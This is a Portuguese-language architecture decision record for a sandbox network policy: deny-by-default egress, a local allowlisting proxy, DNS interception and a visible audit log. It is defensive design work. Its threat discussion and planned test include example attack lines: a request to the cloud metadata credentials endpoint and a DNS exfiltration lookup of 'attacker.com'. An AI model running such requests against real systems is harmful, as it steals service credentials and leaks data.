# 0033 — Política de rede do sandbox: deny-by-default, proxy local, log visível

## Contexto

O ADR-0031 fixa o sandbox da Fase 7 como combinação de **Jail + Job Object + Restricted Token + env zeroed**. Nenhuma dessas primitivas isola rede. O processo filho do sandbox usa a rede do host **diretamente** — o que, em v1, é vetor de duas classes de problema:

1. **Exfiltração silenciosa**: um filho de `exec.python` que conseguiu ler `OPENAI_API_KEY` (porque a env foi zerada mas a chave está em cache de DLL, em TLS handshake, em estrutura de adapter) pode subir o conteúdo para um endpoint arbitrário. A `I2` do `security-threat-model.md` (SSRF) cobre o caso de o **modelo** apontar para IP interno; o caso de o **filho do sandbox** apontar para IP externo é diferente e não está coberto.
2. **SSRF reverso**: o filho faz `requests.get("http://169.254.169.254/latest/meta-data/iam/security-credentials/")` para coletar credenciais de serviço de cloud. Em desktop local a ameaça é menor (não há metadata service), mas o link-local e o RFC1918 são vetores de leitura de outros dispositivos da LAN do usuário.

O `PROMPT MESTRE` §22.5 já fixa o caminho:

> "Rede do sandbox só através de proxy local do app, com allowlist e registro de URLs visível ao usuário na conversa."

A frase está na regra do prompt mestre, mas o mecanismo concreto (como o proxy roda, como é configurado, como o filho sabe o endereço, como o allowlist é editado, como o log aparece) **não está decidido**. Esta Etapa 1 fecha esse mecanismo.

A decisão precisa conviver com três restrições práticas:

- **Sem PATH global alterado** (`PROMPT MESTRE` §5.2) — o filho não pode receber `HTTPS_PROXY=http://localhost:9000` via env, porque o mecanismo de env zerado (D5 do ADR-0031) tira vars de proxy. O endereço do proxy tem que vir de outra forma.
- **Sem interceptação de DNS no nível do host** (não há permissão para isso) — DNS exfiltration via `socket.getaddrinfo("attacker.com")` resolve para IP público normalmente, o proxy só vê IP.
- **Filho roda sob Restricted Token** (D4 do ADR-0031) — não pode ouvir em porta, não pode abrir arquivo fora do workspace. O proxy roda no app principal (com todos os privilégios), não no filho.

A regra de honestidade do `SECURITY.md` (REGRA 1.1) também: o documento precisa dizer o que o proxy **não** faz (não é firewall, não é VPN, não inspecciona TLS — é só allowlist de host + log).

## Decisões

### D1 — Rede do sandbox é **negada por padrão**

Quando o sandbox da Fase 7 está ativo (Etapa 2 em diante), o filho de `exec.python`/`exec.node`/`exec.shell` **não tem rota default para a internet** e **não tem rota para a LAN**. Toda requisição TCP/IP do filho passa (ou tenta passar) pelo proxy local do app.

Concretamente: o proxy cria um **nameserver interceptador** via `netsh` (Windows) na primeira execução do sandbox, apontando `127.0.0.1:PORT` como DNS. O filho, ao resolver `pypi.org`, recebe o IP que o proxy decide devolver (ou NXDOMAIN, se o host não está na allowlist). Sem essa intercepção, o filho usa o DNS do host normalmente — DNS exfiltration vira trivial.

`netsh dns set` é revertido no fim do sandbox (ou em crash recovery, via `kill_on_job_close` do Job Object, D3 do ADR-0031). Sem essa reversão, o usuário fica com DNS quebrado entre execuções — defeito de UX que abre precedente de "DNS às vezes não funciona".

### D2 — Proxy local = Tokio task no app, escuta 127.0.0.1:PORT efêmero

Mecanismo:

1. App cria um `tokio::net::TcpListener` em `127.0.0.1:0` (porta atribuída pelo OS) na primeira execução do sandbox.
2. App lê a porta, escreve em um arquivo dentro do workspace do sandbox (`<workspace>/.frederico/proxy.port`) que o filho sabe ler (Jail garante que o arquivo está dentro do workspace).
3. App injeta **três env vars** no env do filho (esse é o único env que passa pelo filtro de allowlist, com理由 explícito em `EnvAllowlist`): `HTTP_PROXY`, `HTTPS_PROXY`, `NO_PROXY=127.0.0.1,localhost` (libs de HTTP padrão leem essas vars para auto-configurar proxy).
4. App roda a Tokio task: para cada `CONNECT` (HTTPS) ou request (HTTP), parseia, valida host contra `NetworkAllowlist`, registra, e reencaminha via `reqwest` (com a config TLS do app, sem sniff).
5. Quando o sandbox termina (job close ou `cancel_token`), app derruba o listener, apaga o arquivo `.frederico/proxy.port`, e reverte o DNS interceptador.

A porta efêmera + arquivo em workspace evita conflito entre múltiplas execuções paralelas (subagentes, multirun) — cada sandbox pega a sua porta, o filho lê do arquivo dedicado.

### D3 — Allowlist de rede é versionada, com default deny

`crates/security::config::NetworkAllowlist` é um `Vec<String>` (hostnames literais ou sufixos: `pypi.org`, `files.pythonhosted.org`, `registry.npmjs.org`, `github.com` para download de releases, `objects.githubusercontent.com`). **Default é vazio** — sem `NetworkAllowlist::default().contains(...)` retornar `true` para nada.

A primeira execução do sandbox com rede necessária (`pip install`, `npm install`) **pede ao usuário para liberar o host** via UI modal (Etapa 7 UI/Polish da Fase 7). Cada host liberado vira entrada em `NetworkAllowlist` que persiste em SQLite (migration `0037_network_allowlist.sql` quando entrar). O usuário pode editar a lista no painel de configurações (mesmo lugar onde edita o `EnvAllowlist`).

Conflito com o princípio "default deny": a UI **não pode** adicionar host sem ação consciente. Botão "Permitir `pypi.org` por esta execução" gera entrada em `NetworkAllowlist` com `ttl: OneExecution`. Botão "Permitir sempre" gera entrada com `ttl: Forever`. Sem UI explícita, nenhum host é permitido.

### D4 — Log visível de toda URL acessada

Toda requisição que passa pelo proxy é registrada no `DbAuditSink` (mesma trilha do `R1` do threat model):

- `kind = 'network_access'`
- `payload = { host, port, method, path_redacted, status_code, bytes_sent, bytes_received, decision: 'allow' | 'deny' }`
- `path_redacted` corta query string (vai como `<redacted>`) — query string frequentemente carrega tokens de API, secrets de URL, etc.

A interface mostra o log na aba "Sandbox" da execução (`docs/architecture/agent-state-machine.md` §"UI de run", Etapa 7 Fase 7): lista cronológica de URLs acessadas, com decisão, código HTTP, e tamanho. **Sem o log visível, a allowlist é cega** — o usuário não tem como auditar o que o filho fez.

`P1` do threat model (prompt injection via página aberta) **ganha uma camada extra** aqui: o conteúdo baixado pelo proxy é entregue ao filho como `untrustedContext` na resposta do `RunExecutor` (mesmo tratamento de "conteúdo recuperado é dado, não instrução"), e o `audit_records_network_access` permite investigar, pós-incidente, **o que o filho pediu** quando a injeção aconteceu.

### D5 — DNS passa pelo proxy, com resolução lazy

O filho chama `socket.getaddrinfo("pypi.org")`. Sem intercepção (D1), o resolvedor do Windows retorna IP público. Com intercepção via `netsh dns set`, o filho chama `127.0.0.1:53` (o próprio proxy) — o proxy resolve via `tokio::net::lookup_host`, valida o hostname contra allowlist **antes** de resolver (para não resolver hosts não permitidos, evitando que o resolvedor local vire vetor de enumeração), e devolve IP se permitido.

A regra "validar antes de resolver" é o que fecha DNS exfiltration: sem ela, o filho pede `attacker.com`, o resolvedor do host resolve para IP, o proxy permite (porque IP está em alguma allowlist? não, a allowlist é por hostname), e o filho conecta. Validar hostname **antes** de chamar `getaddrinfo` impede o request de chegar à rede.

**Implementação real (fechada na Etapa 7 da Fase 7):** `crates/security/src/dns_proxy.rs` — responder DNS mínimo (RFC 1035, só `QTYPE=A`/IPv4) sobre `UdpSocket`, wireado em `crates/tool-registry/src/exec/mod.rs::start_network_proxy` junto com `crates/security/src/dns_intercept.rs::set_dns_intercept(53)`. `AAAA` e demais `QTYPE` voltam `NXDOMAIN` sem tentar resolver (lacuna IPv4-only documentada, mesmo espírito do HTTP/3-QUIC do §Pendências). Falha ao ativar (porta 53 ocupada, `netsh` sem Admin, ou fora do Windows) é degradação parcial: loga warning, segue **sem** DNS intercept — o proxy HTTP/HTTPS continua ativo e obrigatório (não aborta o sandbox). Na prática, a maioria dos usuários (não-Admin) roda sempre nesse modo degradado; o intercept completo vale pra quem roda elevado (CI, dev local como Admin).

### D6 — `NO_PROXY` cobre o próprio proxy (evita loop)

`NO_PROXY=127.0.0.1,localhost` é obrigatório no env do filho. Sem ele, `requests.get("https://127.0.0.1:9999/")` do filho (tentando auto-loopar) passa pelo próprio proxy, que faz CONNECT para `127.0.0.1:9999`, que é o próprio listener, que … loop infinito até timeout.

A regra está em `EnvAllowlist::REQUIRED` (a Etapa 2 da Fase 7 introduz esse subenum, com itens que **sempre** passam pelo filtro, sem chance do usuário desligar).

### D7 — Proxy foi **opt-out** por feature flag durante a Etapa 2-6 (fechado)

A primeira versão (Etapa 2 da Fase 7) implementou o proxy com **feature flag `FREDERICO_NETWORK_PROXY_V1`** (env var) que **default era ON** mas podia ser desligada para debugging.

Durante a Etapa 2-6, o proxy foi exercitado em todo PR (regressão obrigatória). Investigar uma falha do CI **desligando o proxy temporariamente** era permitido (com log explícito) mas virava pendência na etapa seguinte.

**Fechado na Etapa 7 da Fase 7:** a flag foi removida (`crates/security/src/env_filter.rs`, `crates/tool-registry/src/exec/mod.rs::start_network_proxy`). O proxy HTTP/HTTPS é incondicional — não há mais kill-switch via env var.

## Consequências

- `crates/security/src/network.rs` (novo) define `NetworkAllowlist`, `ProxyConfig`, e o listener Tokio. Tamanho estimado: ~400 linhas.
- `crates/security/src/dns_intercept.rs` (novo) faz o `netsh dns set`/revert. Tamanho estimado: ~150 linhas. **Só Windows** — `linux` é `Err(NotSupported)` (degradação declarada).
- `EnvAllowlist` (D5 do ADR-0031) ganha subenum `EnvAllowlist::REQUIRED` com pelo menos `HTTP_PROXY`, `HTTPS_PROXY`, `NO_PROXY`, `PATH` (do runtime portátil, ADR-0037), `TEMP`, `TMP`, `LANG`, `LC_ALL`, `PYTHONHOME`, `PYTHONPATH`, `NODE_PATH`, `HOME`, `USERPROFILE`. **Não pode ser editado pelo usuário** (são parte do contrato do sandbox).
- O `DbAuditSink` (já existe da Fase 3) ganha 1 `kind` novo: `'network_access'`. Tabela `tool_audit` (migration 0005) já tem coluna `payload TEXT` (JSON), então nenhuma migração nova.
- O `RunExecutor` da Fase 3 ganha 1 hook: `executor.proxy_endpoint() -> Option<Url>` (devolve `http://127.0.0.1:PORT` se proxy ativo, `None` se não). O spawn do filho passa `HTTP_PROXY=<esse valor>` no env (D2).
- O `Jail` (Fase 6 Etapa 5.X) ganha 1 entrada nova na lista de paths permitidos por padrão: `<workspace>/.frederico/proxy.port` (D2). Sem isso, o filho não consegue ler o arquivo e o proxy não funciona.
- A UI da Fase 7 Etapa 7 ganha 1 componente: `NetworkAccessLog` (mostra `audit_records_network_access` em ordem cronológica, com decisão, código HTTP, tamanho, link "ocultar/mostrar path" porque a query string é `<redacted>`).
- A regra de "teste de negação" (do prompt do user) **vale aqui também**: a Etapa 7 da Fase 7 entrega pelo menos um teste de `NetworkAccessBlocked` — filho tenta `requests.get("http://169.254.169.254/")`, afirma que recebe `ProxyError` com mensagem clara, e o `DbAuditSink` tem a entrada com `decision: 'deny'`.

## Alternativas consideradas

1. **Sem proxy, sandbox sem rede** (rejeitar tudo por padrão, exigir opt-in por execução). Rejeitado porque a Fase 7 tem `pip install` / `npm install` como caso de uso real — sem rede, esses comandos falham, e o Modo Desenvolvedor perde a razão de existir. Negar tudo e exigir opt-in por execução é equivalente a D1-D3; a diferença é o mecanismo de opt-in.
2. **Proxy com TLS interception (MITM)** (`PROMPT MESTRE` §22.5 não pede, mas é o que muitos "secure web gateway" fazem). Rejeitado por (a) custo de instalar CA custom no trust store do Windows, (b) quebra TLS para serviços que usam certificate pinning (PyPI, npm), (c) introduz nova superfície de ataque (CA private vira asset a proteger). Allowlist por hostname + log é o suficiente para as ameaças da Fase 7.
3. **Allowlist por IP** (em vez de hostname). Rejeitado por (a) IPs mudam (PyPI roda em CDN, IPs variam por região e por tempo), (b) usuário não tem como manter allowlist de IP atualizada, (c) IP sozinho não carrega semântica de "site confiável" (o IP da Cloudflare hospeda conteúdo arbitrário).
4. **Allowlist por categoria** (blocklist de ads, blocklist de malware, allowlist do resto). Rejeitado por (a) depende de serviço externo de categorização, que vira dependência runtime, (b) o Modo Desenvolvedor tem caso de uso legítimo em hosts que categorização generalista classifica errado. Allowlist explícita por hostname é o que o `PROMPT MESTRE` §22.5 pede.
5. **Filho roda em conta de usuário separada** (D6 do ADR-0031, rejeitado lá). Mesma justificativa: criar/destruir perfil é caro, e o proxy local já cobre a ameaça.

## Pendências

- **Detecção de certificate pinning bypass** (filho que ignora `HTTPS_PROXY` e conecta direto via `socket.socket(AF_INET, SOCK_STREAM)` raw). A Etapa 7 (rede) **não** cobre: o firewall do Windows no nível de processo (`Windows Defender Application Control` / `WDAC`) é que cobriria, e é roadmap de Fase 8+. O sandbox da Fase 7 documenta essa lacuna no `security-threat-model.md`.
- **`HTTP/3` (QUIC)** — o proxy atual fala TCP+TLS. Filhos que tentam QUIC (raro em Python/Node de uso geral) bypassam o proxy. **Lacuna documentada**, sem mitigação na v1.
- **Allowlist por regex / pattern** (ex.: `*.pythonhosted.org` cobre todos os subdomínios). A Etapa 2 da Fase 7 implementa match por **sufixo literal** (`pypi.org` casa `pypi.org` e `files.pypi.org`; **não** casa `pypi.org.attacker.com`). Pattern glob é roadmap.
- **Auditoria do próprio proxy** — o listener Tokio pode travar em request malformado. A Etapa 2 implementa timeout de 5s por request e watchdog no nível do Job Object; comportamento pós-timeout documentado.
- **UI de "adicionar host à allowlist"** — modal aparece quando filho tenta acessar host não permitido. Decisão: "permitir uma vez / permitir sempre / bloquear". A Etapa 7 (UI/Polish) implementa.
- **Migração de allowlist pré-existente** — se o usuário tinha `NetworkAllowlist` configurada em versão anterior, a Etapa 2 carrega. Sem migração (projeto novo), entra como entrada inicial vazia + tutorial na primeira execução.

## Histórico de revisão

- 2026-08-08 — versão inicial. Decisão da Etapa 1 da Fase 7. Validação pelo user (via `ask_user`): "Rede do sandbox negada por padrão, com proxy local e log visível — decisão do prompt mestre que precisa virar ADR com o mecanismo concreto." O mecanismo concreto (Tokio task + `netsh dns` + allowlist por hostname + log em `DbAuditSink` + `NO_PROXY` para evitar loop) é o que faltava do `PROMPT MESTRE` §22.5 — sem ele, a regra do prompt mestre é intenção, não especificação.
